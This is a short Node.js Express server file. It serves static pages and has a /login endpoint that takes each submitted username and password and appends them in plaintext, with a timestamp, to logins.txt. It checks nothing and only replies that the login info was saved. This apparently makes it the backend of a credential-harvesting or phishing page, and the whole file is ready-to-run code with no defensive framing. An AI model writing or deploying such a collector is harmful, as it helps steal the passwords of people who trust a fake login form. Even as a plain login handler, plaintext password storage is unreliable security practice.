const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname)));

// Endpoint to handle login
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const logEntry = `Username/Email: ${username}, Password: ${password}, Timestamp: ${new Date().toISOString()}\n`;

  // Append to logins.txt
  fs.appendFile('logins.txt', logEntry, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).send('Error saving login info');
    }
    res.send('Login info saved');
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

